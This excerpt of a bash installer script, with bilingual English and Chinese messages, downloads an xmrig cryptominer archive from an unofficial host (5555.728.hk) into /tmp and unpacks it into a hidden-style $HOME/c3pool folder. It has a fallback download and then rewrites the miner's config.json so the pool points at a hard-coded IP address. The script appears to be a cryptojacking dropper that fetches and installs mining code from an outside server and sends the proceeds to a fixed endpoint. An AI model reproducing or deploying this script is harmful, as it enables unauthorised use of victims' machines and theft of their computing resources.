...
echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/888.tar.gz"
echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/888.tar.gz 中"
if ! curl -L --progress-bar "https://5555.728.hk/888.tar.gz" -o /tmp/888.tar.gz; then
  echo "ERROR: Can't download https://5555.728.hk/888.tar.gz file to /tmp/888.tar.gz"
  echo "发生错误: 无法下载 https://5555.728.hk/888.tar.gz 文件到 /tmp/888.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/888.tar.gz to $HOME/c3pool"
echo "[*] 解压 /tmp/888.tar.gz 到 $HOME/c3pool"
[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
if ! tar xf /tmp/888.tar.gz -C $HOME/c3pool; then
  echo "ERROR: Can't unpack /tmp/888.tar.gz to $HOME/c3pool directory"
  echo "发生错误: 无法解压 /tmp/888.tar.gz 到 $HOME/c3pool 目录"
  exit 1
fi
rm /tmp/888.tar.gz
...
if (test $? -ne 0); then
  ...
  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/888.tar.gz"
  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/888.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/888.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/888.tar.gz"
	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/888.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/888.tar.gz to $HOME/c3pool"
  echo "[*] 解压 /tmp/888.tar.gz 到 $HOME/c3pool"
  if ! tar xf /tmp/888.tar.gz -C $HOME/c3pool --strip=1; then
    echo "WARNING: Can't unpack /tmp/888.tar.gz to $HOME/c3pool directory"
	echo "警告: 无法解压 /tmp/888.tar.gz 到 $HOME/c3pool 目录下"
  fi
  rm /tmp/888.tar.gz
...
sed -i 's/"url": *"[^"]*",/"url": "174.139.20.137:'$PORT'",/' $HOME/c3pool/config.json
